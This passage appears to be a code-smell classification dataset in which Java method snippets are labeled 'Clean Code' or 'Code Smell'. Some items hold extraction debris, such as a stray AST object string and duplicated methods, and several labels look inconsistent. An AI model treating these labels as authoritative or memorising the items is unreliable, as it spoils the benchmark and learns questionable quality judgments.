 * @param adapterPosition  The adapter position of viewHolder inside adapter.
 * @param selectedPosition The adapter position of currently selected row.
 * @param selectedSubPosition The sub position within currently selected row.  This is usedWhen a row has multiple alignment positions.
 */
protected void onSetDetailsOverviewRowStatus(FullWidthDetailsOverviewRowPresenter presenter,FullWidthDetailsOverviewRowPresenter.ViewHolder viewHolder,int adapterPosition,int selectedPosition,int selectedSubPosition){
  if (selectedPosition > adapterPosition) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_HALF);
  }
 else   if (selectedPosition == adapterPosition && selectedSubPosition == 1) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_HALF);
  }
 else   if (selectedPosition == adapterPosition && selectedSubPosition == 0) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_FULL);
  }
 else {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_SMALL);
  }
}",0,Clean Code
"/** 
 * <p>Returns the next pseudorandom, uniformly distributed long value from the Math.random() sequence.</p> <b>N.B. All values are >= 0.<b>
 * @return the random long
 */
public static long nextLong(){
  return nextLong(JVM_RANDOM);
}
/** 
 * <p>Returns the next pseudorandom, uniformly distributed long value from the given Random sequence.</p>
 * @param random the Random sequence generator.
 * @return the random long
 */
public static long nextLong(Random random){
  return random.nextLong();
}",0,Clean Code
"private static void buildFragmentInfo(WApplication wApplication,Activity activity,boolean isMainThread){
  ArrayList<WFragment> childFragments=new ArrayList<>();
  if (activity instanceof FragmentActivity) {
    final androidx.fragment.app.FragmentManager supportFragmentManager=((FragmentActivity)activity).getSupportFragmentManager();
    List<androidx.fragment.app.Fragment> fragments=supportFragmentManager.getFragments();
    if (!fragments.isEmpty()) {
      for (      androidx.fragment.app.Fragment f : fragments) {
        try {
          childFragments.add(convertFragmentToWFragment(f,isMainThread));
        }
 catch (        Throwable t) {
          Log.d(CodeLocator.TAG,""convertFragmentToWFragment error, stackTrace: "" + Log.getStackTraceString(t));
        }
      }
    }
  }
  final FragmentManager fragmentManager=activity.getFragmentManager();
  if (fragmentManager != null) {
    List<Fragment> fragments=null;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      fragments=fragmentManager.getFragments();
    }
 else {
      try {
        Field classField=ReflectUtils.getClassField(fragmentManager.getClass(),""mAdded"");
        fragments=(List<Fragment>)classField.get(fragmentManager);
      }
 catch (      Throwable t) {
        fragments=new ArrayList<>();
      }
    }
    if (!fragments.isEmpty()) {
      for (      Fragment f : fragments) {
        try {
          childFragments.add(convertFragmentToWFragment(f,isMainThread));
        }
 catch (        Throwable t) {
          Log.d(CodeLocator.TAG,""convertFragmentToWFragment error, stackTrace: "" + Log.getStackTraceString(t));
        }
      }
    }
  }
  if (!childFragments.isEmpty()) {
    wApplication.getActivity().setFragments(childFragments);
  }
}
",1,Code Smell
"private static PageInfo<CodeTopQuestionView> getQuestionService(Project project,PageInfo pageInfo){
  String url=CodeTopURLUtils.getQuestions() + ""?page="" + pageInfo.getPageIndex();
  PageInfo.Filters filters=pageInfo.getFilters();
  if (StringUtils.isNotBlank(filters.getOrderBy())) {
    url=url + ""&ordering="" + (""DESCENDING"".equals(filters.getSortOrder()) ? ""-"" : """")+ filters.getOrderBy();
  }
  if (StringUtils.isNotBlank(filters.getDifficulty())) {
    url=url + ""&leetcode__level="" + filters.getDifficulty();
  }
  if (filters.getTags() != null && !filters.getTags().isEmpty()) {
    url=url + ""&leetcode__tags="" + filters.getTags().get(0);
  }
  if (StringUtils.isNotBlank(filters.getListId())) {
    url=url + ""&company="" + filters.getListId();
  }
  HttpResponse response=HttpRequest.builderGet(url).request();
  if (response.getStatusCode() == 200) {
    List<CodeTopQuestionView> questionList=new ArrayList();
    JSONObject pageObject=JSONObject.parseObject(response.getBody());
    JSONArray questionJsonArray=pageObject.getJSONArray(""list"");
    for (int i=0; i < pageObject.getJSONArray(""list"").size(); i++) {
      JSONObject codeTopQuestionJsonObject=questionJsonArray.getJSONObject(i);
      JSONObject questionJsonObject=codeTopQuestionJsonObject.getJSONObject(""leetcode"");
      CodeTopQuestionView question=new CodeTopQuestionView();
      question.setTitle(questionJsonObject.getString(""title""));
      question.setFrontendQuestionId(questionJsonObject.getString(""frontend_question_id""));
      question.setLevel(questionJsonObject.getString(""level""));
      question.setTitleSlug(questionJsonObject.getString(""slug_title""));
      question.setInspectFrequency(codeTopQuestionJsonObject.getInteger(""value""));
      String time=codeTopQuestionJsonObject.getString(""time"");
      if (StringUtils.isNotBlank(time) && time.length() > 10) {
        question.setInspectTime(time.substring(0,10));
      }
 else {
        question.setInspectTime(time);
      }
      QuestionIndex questionIndex=QuestionManager.getQuestionIndex(question.getTitleSlug());
      if (questionIndex != null) {
        question.setStatus(questionIndex.getQuestionView().getStatus());
      }
      questionList.add(question);
    }
    pageInfo.setRowTotal(pageObject.getInteger(""count""));
    pageInfo.setRows(questionList);
  }
 else {
    LogUtils.LOG.error(""Request question list failed, status:"" + response.getStatusCode());
    throw new RuntimeException(""Request question list failed"");
  }
  return pageInfo;
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (LicenseStatus.sDisableCommonHooks) {
    return;
  }
  if (!bInspectMode) {
    return;
  }
  if (!isEnabled()) {
    return;
  }
  Context ctx=iget_object_or_null(param.thisObject,""a"",Context.class);
  if (ctx == null) {
    ctx=getFirstNSFByType(param.thisObject,Context.class);
  }
  View view=(View)param.args[0];
  if (ctx == null || MultiForwardAvatarHook.isLeftCheckBoxVisible()) {
    return;
  }
  String activityName=ctx.getClass().getName();
  if (activityName.equals(""com.tencent.mobileqq.activity.MultiForwardActivity"")) {
    return;
  }
  final Object msg=MultiForwardAvatarHook.getChatMessageByView(view);
  if (msg == null) {
    return;
  }
  CustomDialog dialog=CustomDialog.createFailsafe(ctx);
  dialog.setTitle(Utils.getShort$Name(msg));
  dialog.setMessage(msg.toString());
  dialog.setCancelable(true);
  dialog.setPositiveButton(""确认"",null);
  dialog.show();
  param.setResult(null);
}",0,Clean Code
"public static String parsePidStr(String rawPidStr){
  log.info(""prepare to parse pid, raw pid string: {}"",rawPidStr);
  ArrayList<String> allPidList=new ArrayList<>();
  Matcher mat=null;
  if (SystemUtils.IS_OS_MAC) {
    if (StringUtils.isNotEmpty(rawPidStr)) {
      mat=MACPATTERN.matcher(rawPidStr);
    }
  }
 else   if (SystemUtils.IS_OS_LINUX) {
    if (StringUtils.isNotEmpty(rawPidStr)) {
      mat=LINUXPATTERN.matcher(rawPidStr);
    }
  }
 else {
    if (StringUtils.isNotEmpty(rawPidStr)) {
      mat=WINDOWSPATTERN.matcher(rawPidStr);
    }
  }
  if (null != mat) {
    while (mat.find()) {
      allPidList.add(mat.group(1));
    }
  }
  return String.join("" "",allPidList).trim();
}",0,Clean Code
"/** 
 * Builds a filter for the current names and selections of the check boxes.
 */
public String buildFilter(){
  StringBuffer positive=new StringBuffer();
  StringBuffer negative=new StringBuffer();
  buildFilter("""",positive,negative);
  return positive.length() <= negative.length() ? positive.toString() : negative.toString();
}
/** 
 * Builds two versions of the filter for the given prefix.
 * @param prefix   the prefix.
 * @param positive the filter to be extended, assuming the matchingstrings are accepted.
 * @param negative the filter to be extended, assuming the matchingstrings are rejected.
 */
private void buildFilter(String prefix,StringBuffer positive,StringBuffer negative){
  int positiveCount=0;
  int negativeCount=0;
  for (int index=0; index < checkBoxes.length; index++) {
    JCheckBox checkBox=checkBoxes[index];
    String name=checkBox.getText();
    if (name.startsWith(prefix)) {
      if (checkBox.isSelected()) {
        positiveCount++;
      }
 else {
        negativeCount++;
      }
    }
  }
  if (positiveCount == 0) {
    if (positive.length() > 0) {
      positive.append(',');
    }
    positive.append('!').append(prefix);
    if (prefix.length() == 0 || prefix.charAt(prefix.length() - 1) == separator) {
      positive.append('*');
    }
    return;
  }
  if (negativeCount == 0) {
    if (negative.length() > 0) {
      negative.append(',');
    }
    negative.append(prefix);
    if (prefix.length() == 0 || prefix.charAt(prefix.length() - 1) == separator) {
      negative.append('*');
    }
    return;
  }
  StringBuffer positiveFilter=new StringBuffer();
  StringBuffer negativeFilter=new StringBuffer();
  String newPrefix=null;
  for (int index=0; index < checkBoxes.length; index++) {
    String name=checkBoxes[index].getText();
    if (name.startsWith(prefix)) {
      if (newPrefix == null || !name.startsWith(newPrefix)) {
        int prefixIndex=name.indexOf(separator,prefix.length() + 1);
        newPrefix=prefixIndex >= 0 ? name.substring(0,prefixIndex + 1) : name;
        buildFilter(newPrefix,positiveFilter,negativeFilter);
      }
    }
  }
  if (positiveFilter.length() <= negativeFilter.length() + prefix.length() + 3) {
    if (positive.length() > 0 && positiveFilter.length() > 0) {
      positive.append(',');
    }
    positive.append(positiveFilter);
  }
 else {
    if (positive.length() > 0 && negativeFilter.length() > 0) {
      positive.append(',');
    }
    positive.append(negativeFilter).append("",!"").append(prefix).append('*');
  }
  if (negativeFilter.length() <= positiveFilter.length() + prefix.length() + 4) {
    if (negative.length() > 0 && negativeFilter.length() > 0) {
      negative.append(',');
    }
    negative.append(negativeFilter);
  }
 else {
    if (negative.length() > 0 && positiveFilter.length() > 0) {
      negative.append(',');
    }
    negative.append(positiveFilter).append(',').append(prefix).append('*');
  }
}",1,Code Smell
"private boolean builtinIgnoreInvokeInstruction(MethodVisitor m,InvokeInstruction instruction,CallGraphEntry callGraphEntry){
  final String calleeMethod=callGraphEntry.getCalleeMethod();
  final String calleeClass=callGraphEntry.getCalleeClazz();
  if (ignore.ignoreClassInnerCall() && m.callerClass.equals(calleeClass)) {
    return true;
  }
  if (!callGraphEntry.getCalleeClazz().contains(""."")) {
    return true;
  }
  if (calleeMethod.equals(methodConstructor) || calleeMethod.equals(methodStaticInit)) {
    return true;
  }
  if (calleeMethod.contains(""$"") || calleeClass.contains(""$"")) {
    return true;
  }
  if (instruction == null) {
    return false;
  }
  int args=instruction.getArgumentTypes(m.constantPoolGen).length;
  if (calleeMethod.startsWith(""get"") && args == 0) {
    log.debug(""getter ignored: {}.{} -> {}.{}"",m.callerClass,m.callerMethod,calleeClass,calleeMethod);
    return true;
  }
  if (calleeMethod.startsWith(""set"") && args == 1) {
    log.debug(""setter ignored: {}.{} -> {}.{}"",m.callerClass,m.callerMethod,calleeClass,calleeMethod);
    return true;
  }
  return false;
}",1,Code Smell
"@Override protected void onDraw(Canvas canvas){
  if (isInEditMode()) {
    canvas.drawArc(oval,0,365,false,mPaint);
    return;
  }
  if (noShowLoading) {
    canvas.drawArc(oval,0,365,false,mPaint);
    successStep=2;
    drawDoneMark(status,canvas);
    return;
  }
  float sweepAngle=(float)(halfSweepA * Math.sin(Math.toRadians(followRotateDegrees))) + halfSweepA + halfSweepAMinValue / 2;
switch (status) {
case STATUS_LOADING:
    canvas.drawArc(oval,currentRotateDegrees,-sweepAngle,false,mPaint);
  break;
case STATUS_SUCCESS:
case STATUS_WARNING:
case STATUS_ERROR:
canvas.drawArc(oval,0,360,false,mPaint);
drawDoneMark(status,canvas);
break;
case STATUS_PROGRESSING:
canvas.drawArc(oval,-90,currentRotateDegrees,false,mPaint);
if (waitProgressingRunnable != null) {
waitProgressingRunnable.run();
waitProgressingRunnable=null;
}
break;
}
}",1,Code Smell
"/** 
 * https://github.com/tommyettinger/BlazingChain
 */
public static String LZ64Decrypt(String str){
  final char[] valStrBase64=new char[]{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,0,0,0,63,52,53,54,55,56,57,58,59,60,61,0,0,0,64,0,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,0,0,0,0,0,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51};
  if (str == null) {
    return null;
  }
  if (str.isEmpty()) {
    return """";
  }
  final char[] input=str.toCharArray();
  return LZ64Decrypt(input.length,32,input,valStrBase64,0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@945e97d",0,Clean Code
"public void setTextAndValueAndTypeAndThumb(String text,String value,String type,String thumb,int resId,boolean divider){
  nameTextView.setText(text);
  dateTextView.setText(value);
  if (type != null) {
    extTextView.setVisibility(VISIBLE);
    extTextView.setText(type.toLowerCase());
  }
 else {
    extTextView.setVisibility(INVISIBLE);
  }
  needDivider=divider;
  if (resId == 0) {
    placeholderImageView.setImageResource(AndroidUtilities.getThumbForNameOrMime(text,type,false));
    placeholderImageView.setVisibility(VISIBLE);
  }
 else {
    placeholderImageView.setVisibility(INVISIBLE);
  }
  if (thumb != null || resId != 0) {
    if (thumb != null) {
      if (viewType != VIEW_TYPE_CACHE) {
        thumbImageView.setImage(thumb,""42_42"",null);
      }
    }
 else {
      Drawable drawable=Theme.createCircleDrawableWithIcon(AndroidUtilities.dp(42),resId);
      int iconKey;
      int backKey;
      if (resId == R.drawable.files_storage) {
        backKey=Theme.key_chat_attachLocationBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_gallery) {
        backKey=Theme.key_chat_attachContactBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_music) {
        backKey=Theme.key_chat_attachAudioBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_internal) {
        backKey=Theme.key_chat_attachGalleryBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else {
        backKey=Theme.key_files_folderIconBackground;
        iconKey=Theme.key_files_folderIcon;
      }
      Theme.setCombinedDrawableColor(drawable,getThemedColor(backKey),false);
      Theme.setCombinedDrawableColor(drawable,getThemedColor(iconKey),true);
      thumbImageView.setImageDrawable(drawable);
    }
    thumbImageView.setVisibility(VISIBLE);
  }
 else {
    extTextView.setAlpha(1.0f);
    placeholderImageView.setAlpha(1.0f);
    if (viewType != VIEW_TYPE_CACHE) {
      thumbImageView.setImageBitmap(null);
      thumbImageView.setVisibility(INVISIBLE);
    }
  }
  setWillNotDraw(!needDivider);
}",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  JavaIsoVisitor<ExecutionContext> condition=new JavaIsoVisitor<ExecutionContext>(){
    @Override public @Nullable J preVisit(    J tree,    ExecutionContext ctx){
      if (tree instanceof JavaSourceFile) {
        JavaSourceFile cu=(JavaSourceFile)requireNonNull(tree);
        if (cu.getPackageDeclaration() != null) {
          String original=cu.getPackageDeclaration().getExpression().printTrimmed(getCursor()).replaceAll(""\\s"","""");
          if (original.startsWith(oldPackageName)) {
            return SearchResult.found(cu);
          }
        }
        boolean recursive=Boolean.TRUE.equals(ChangePackage.this.recursive);
        String recursivePackageNamePrefix=oldPackageName + ""."";
        for (        J.Import anImport : cu.getImports()) {
          String importedPackage=anImport.getPackageName();
          if (importedPackage.equals(oldPackageName) || recursive && importedPackage.startsWith(recursivePackageNamePrefix)) {
            return SearchResult.found(cu);
          }
        }
        for (        JavaType type : cu.getTypesInUse().getTypesInUse()) {
          if (type instanceof JavaType.FullyQualified) {
            String packageName=((JavaType.FullyQualified)type).getPackageName();
            if (packageName.equals(oldPackageName) || recursive && packageName.startsWith(recursivePackageNamePrefix)) {
              return SearchResult.found(cu);
            }
          }
        }
        stopAfterPreVisit();
      }
      return super.preVisit(tree,ctx);
    }
  }
;
  return Preconditions.check(condition,new ChangePackageVisitor());
}
",1,Code Smell
"@EventHandler private void onRender2D(Render2DEvent event){
  int count=getRenderCount();
  boolean shadow=Config.get().customFont.get();
  for (int i=count - 1; i > -1; i--) {
    Entity entity=entityList.get(i);
    Utils.set(pos,entity,event.tickDelta);
    pos.add(0,getHeight(entity),0);
    EntityType<?> type=entity.getType();
    if (NametagUtils.to2D(pos,scale.get())) {
      if (type == EntityType.PLAYER)       renderNametagPlayer(event,(PlayerEntity)entity,shadow);
 else       if (type == EntityType.ITEM)       renderNametagItem(((ItemEntity)entity).getStack(),shadow);
 else       if (type == EntityType.ITEM_FRAME)       renderNametagItem(((ItemFrameEntity)entity).getHeldItemStack(),shadow);
 else       if (type == EntityType.TNT)       renderTntNametag((TntEntity)entity,shadow);
 else       if (entity instanceof LivingEntity)       renderGenericNametag((LivingEntity)entity,shadow);
    }
  }
}",0,Clean Code
"@Override public final void onTimelineChanged(Timeline timeline,@Nullable Object manifest,@Player.TimelineChangeReason int reason){
  mediaPeriodQueueTracker.onTimelineChanged(timeline);
  EventTime eventTime=generatePlayingMediaPeriodEventTime();
  for (  AnalyticsListener listener : listeners) {
    listener.onTimelineChanged(eventTime,reason);
  }
}
/** 
 * Updates the queue with a reported timeline change. 
 */
public void onTimelineChanged(Timeline timeline){
  for (int i=0; i < mediaPeriodInfoQueue.size(); i++) {
    MediaPeriodInfo newMediaPeriodInfo=updateMediaPeriodInfoToNewTimeline(mediaPeriodInfoQueue.get(i),timeline);
    mediaPeriodInfoQueue.set(i,newMediaPeriodInfo);
    mediaPeriodIdToInfo.put(newMediaPeriodInfo.mediaPeriodId,newMediaPeriodInfo);
  }
  if (readingMediaPeriod != null) {
    readingMediaPeriod=updateMediaPeriodInfoToNewTimeline(readingMediaPeriod,timeline);
  }
  this.timeline=timeline;
  updateLastReportedPlayingMediaPeriod();
}",0,Clean Code
"@Override public boolean mouseScrolled(double pMouseX,double pMouseY,double pDelta){
  if (destinationSuggestions != null && destinationSuggestions.mouseScrolled(Mth.clamp(pDelta,-1.0D,1.0D)))   return true;
  if (editingCondition != null || editingDestination != null)   return super.mouseScrolled(pMouseX,pMouseY,pDelta);
  if (hasShiftDown()) {
    List<ScheduleEntry> entries=schedule.entries;
    int y=(int)(pMouseY - topPos - 25 + scroll.getValue());
    for (int i=0; i < entries.size(); i++) {
      ScheduleEntry entry=entries.get(i);
      int maxRows=0;
      for (      List<ScheduleWaitCondition> list : entry.conditions)       maxRows=Math.max(maxRows,list.size());
      int cardHeight=CARD_HEADER + 24 + maxRows * 18;
      if (y >= cardHeight) {
        y-=cardHeight + 9;
        if (y < 0)         break;
        continue;
      }
      if (!isConditionAreaScrollable(entry))       break;
      if (y < 24)       break;
      if (pMouseX < leftPos + 25)       break;
      if (pMouseX > leftPos + 205)       break;
      float chaseTarget=horizontalScrolls.get(i).getChaseTarget();
      if (pDelta > 0 && !Mth.equal(chaseTarget,0)) {
        horizontalScrolls.get(i).chase(chaseTarget - 1,0.5f,Chaser.EXP);
        return true;
      }
      if (pDelta < 0 && !Mth.equal(chaseTarget,entry.conditions.size() - 1)) {
        horizontalScrolls.get(i).chase(chaseTarget + 1,0.5f,Chaser.EXP);
        return true;
      }
      return false;
    }
  }
  float chaseTarget=scroll.getChaseTarget();
  float max=40 - 173;
  for (  ScheduleEntry scheduleEntry : schedule.entries) {
    int maxRows=0;
    for (    List<ScheduleWaitCondition> list : scheduleEntry.conditions)     maxRows=Math.max(maxRows,list.size());
    max+=CARD_HEADER + 24 + maxRows * 18 + 10;
  }
  if (max > 0) {
    chaseTarget-=pDelta * 12;
    chaseTarget=Mth.clamp(chaseTarget,0,max);
    scroll.chase((int)chaseTarget,0.7f,Chaser.EXP);
  }
 else   scroll.chase(0,0.7f,Chaser.EXP);
  return super.mouseScrolled(pMouseX,pMouseY,pDelta);
}",1,Code Smell
"/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
",0,Clean Code
"private void updateVideoPlayerTime(){
  Arrays.fill(videoPlayerCurrentTime,0);
  Arrays.fill(videoPlayerTotalTime,0);
  if (videoPlayer != null) {
    long current=Math.max(0,videoPlayer.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,videoPlayer.getDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
 else   if (photoViewerWebView != null && photoViewerWebView.isControllable()) {
    long current=Math.max(0,photoViewerWebView.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,photoViewerWebView.getVideoDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
  String current, total;
  if (videoPlayerCurrentTime[0] >= 60) {
    current=format(videoPlayerCurrentTime[0] / 60,videoPlayerCurrentTime[0] % 60,videoPlayerCurrentTime[1]);
  }
 else {
    current=format(videoPlayerCurrentTime[0],videoPlayerCurrentTime[1]);
  }
  if (videoPlayerTotalTime[0] >= 60) {
    total=format(videoPlayerTotalTime[0] / 60,videoPlayerTotalTime[0] % 60,videoPlayerTotalTime[1]);
  }
 else {
    total=format(videoPlayerTotalTime[0],videoPlayerTotalTime[1]);
  }
  videoPlayerTime.setText(current + "" / "" + total);
  if (!Objects.equals(lastControlFrameDuration,total)) {
    lastControlFrameDuration=total;
    videoPlayerControlFrameLayout.requestLayout();
  }
}",1,Code Smell
"@SuppressWarnings(""deprecation"") private void bindTags(GalleryTagGroup[] tagGroups){
  Context context=getEHContext();
  LayoutInflater inflater=getLayoutInflater2();
  Resources resources=getResources2();
  if (null == context || null == resources || null == mTags || null == mNoTags) {
    return;
  }
  mTags.removeViews(1,mTags.getChildCount() - 1);
  if (tagGroups == null || tagGroups.length == 0) {
    mNoTags.setVisibility(View.VISIBLE);
    return;
  }
 else {
    mNoTags.setVisibility(View.GONE);
  }
  EhTagDatabase ehTags=Settings.getShowTagTranslations() ? EhTagDatabase.getInstance(context) : null;
  int colorTag=AttrResources.getAttrColor(context,R.attr.tagBackgroundColor);
  int colorName=AttrResources.getAttrColor(context,R.attr.tagGroupBackgroundColor);
  for (  GalleryTagGroup tg : tagGroups) {
    LinearLayout ll=(LinearLayout)inflater.inflate(R.layout.gallery_tag_group,mTags,false);
    ll.setOrientation(LinearLayout.HORIZONTAL);
    mTags.addView(ll);
    String readableTagName=null;
    if (ehTags != null) {
      readableTagName=ehTags.getTranslation(""n:"" + tg.groupName);
    }
    TextView tgName=(TextView)inflater.inflate(R.layout.item_gallery_tag,ll,false);
    ll.addView(tgName);
    tgName.setText(readableTagName != null ? readableTagName : tg.groupName);
    tgName.setBackgroundDrawable(new RoundSideRectDrawable(colorName));
    String prefix=EhTagDatabase.namespaceToPrefix(tg.groupName);
    if (prefix == null) {
      prefix="""";
    }
    AutoWrapLayout awl=new AutoWrapLayout(context);
    ll.addView(awl,ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
    for (int j=0, z=tg.size(); j < z; j++) {
      TextView tag=(TextView)inflater.inflate(R.layout.item_gallery_tag,awl,false);
      awl.addView(tag);
      String tagStr=tg.getTagAt(j);
      String readableTag=null;
      if (ehTags != null) {
        readableTag=ehTags.getTranslation(prefix + tagStr);
      }
      tag.setText(readableTag != null ? readableTag : tagStr);
      tag.setBackgroundDrawable(new RoundSideRectDrawable(colorTag));
      tag.setTag(R.id.tag,tg.groupName + "":"" + tagStr);
      tag.setOnClickListener(this);
      tag.setOnLongClickListener(this);
    }
  }
}",1,Code Smell
"private void requestLinkPreview(TLRPC.TL_messages_getWebPagePreview req,Utilities.Callback2<Boolean,TLRPC.WebPage> done){
  cancelSearchLinks();
  linkSearchRequestId=getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    linkSearchRequestId=0;
    if (response instanceof TLRPC.TL_messageMediaWebPage) {
      TLRPC.TL_messageMediaWebPage media=(TLRPC.TL_messageMediaWebPage)response;
      if (media.webpage != null && ""telegram_story"".equals(media.webpage.type)) {
        TLRPC.TL_webPageAttributeStory _attrStory=null;
        if (media.webpage.attributes != null) {
          for (int i=0; i < media.webpage.attributes.size(); ++i) {
            if (media.webpage.attributes.get(i) instanceof TLRPC.TL_webPageAttributeStory) {
              _attrStory=(TLRPC.TL_webPageAttributeStory)media.webpage.attributes.get(i);
              break;
            }
          }
        }
        if (_attrStory == null) {
          done.run(false,null);
          return;
        }
        if (_attrStory != null && _attrStory.storyItem != null) {
          done.run(true,media.webpage);
          return;
        }
        final TLRPC.TL_webPageAttributeStory attrStory=_attrStory;
        getMessagesStorage().getStorageQueue().postRunnable(() -> {
          try {
            LongSparseArray<ArrayList<MessageObject>> array=new LongSparseArray<>();
            TLRPC.TL_message message=new TLRPC.TL_message();
            message.message="""";
            message.id=0;
            message.media=media;
            ArrayList<MessageObject> list=new ArrayList<>();
            list.add(new MessageObject(currentAccount,message,false,false));
            array.put(DialogObject.getPeerDialogId(attrStory.peer),list);
            getMessagesController().getStoriesController().getStoriesStorage().fillMessagesWithStories(array,() -> {
              MessageObject result=null;
              if (array.size() == 1 && array.valueAt(0) != null && array.valueAt(0).size() == 1) {
                result=array.valueAt(0).get(0);
              }
              if (result != null && result.messageOwner != null && result.messageOwner.media != null && result.messageOwner.media.webpage != null && result.messageOwner.media.webpage.attributes != null) {
                for (int i=0; i < result.messageOwner.media.webpage.attributes.size(); ++i) {
                  TLRPC.WebPageAttribute attr=result.messageOwner.media.webpage.attributes.get(i);
                  if (attr instanceof TLRPC.TL_webPageAttributeStory) {
                    if (((TLRPC.TL_webPageAttributeStory)attr).storyItem != null) {
                      final TLRPC.WebPage webpage=result.messageOwner.media.webpage;
                      AndroidUtilities.runOnUIThread(() -> {
                        done.run(true,webpage);
                      }
);
                      return;
                    }
                  }
                }
              }
              AndroidUtilities.runOnUIThread(() -> {
                done.run(false,null);
              }
);
            }
,classGuid,false);
          }
 catch (          Exception ignore) {
          }
        }
);
      }
 else {
        done.run(media.webpage != null,media.webpage);
      }
    }
 else {
      done.run(false,null);
    }
  }
));
  getConnectionsManager().bindRequestToGuid(linkSearchRequestId,classGuid);
}",1,Code Smell
"@Override public void onProcessMessage(V2TIMMessage v2TIMMessage){
  String data=new String(v2TIMMessage.getCustomElem().getData());
  if (!TextUtils.isEmpty(data)) {
    invisibleBean=new InvisibleBean();
    try {
      JSONObject invisibleJson=new JSONObject(data);
      invisibleBean.src=invisibleJson.optString(TUIConstants.TUICustomerServicePlugin.CUSTOMER_SERVICE_BUSINESS_ID_SRC_KEY);
      JSONObject contentJson=invisibleJson.optJSONObject(TUICustomerServiceConstants.CUSTOMER_SERVICE_ITEM_CONTENT);
      if (contentJson != null) {
        invisibleBean.menuSendRuleFlag=contentJson.optInt(InvisibleBean.MENU_SEND_RULE_FLAG);
      }
    }
 catch (    JSONException e) {
      TUIChatLog.e(""InvisibleMessageBean"",""exception e = "" + e);
    }
  }
  if (invisibleBean != null) {
    if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SELECTED)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.satisfaction_evaluation));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_END)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_end));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TIMEOUT)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_timeout));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SETTING)) {
      int triggerResult=invisibleBean.menuSendRuleFlag & invisibleBean.RULE_USER_TRIGGER_EVALUATION;
      TUICustomerServicePluginService.getInstance().setCanTriggerEvaluation(triggerResult > 0 ? true : false);
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TRIGGER_EVALUATION)) {
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_SAY_HELLO)) {
    }
 else {
      String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
      setExtra(text);
    }
  }
 else {
    String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
    setExtra(text);
  }
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  DriverIdentity other=(DriverIdentity)obj;
  if (driverClassName == null) {
    if (other.driverClassName != null)     return false;
  }
 else   if (!driverClassName.equals(other.driverClassName))   return false;
  if (majorVersion != other.majorVersion)   return false;
  if (minorVersion != other.minorVersion)   return false;
  return true;
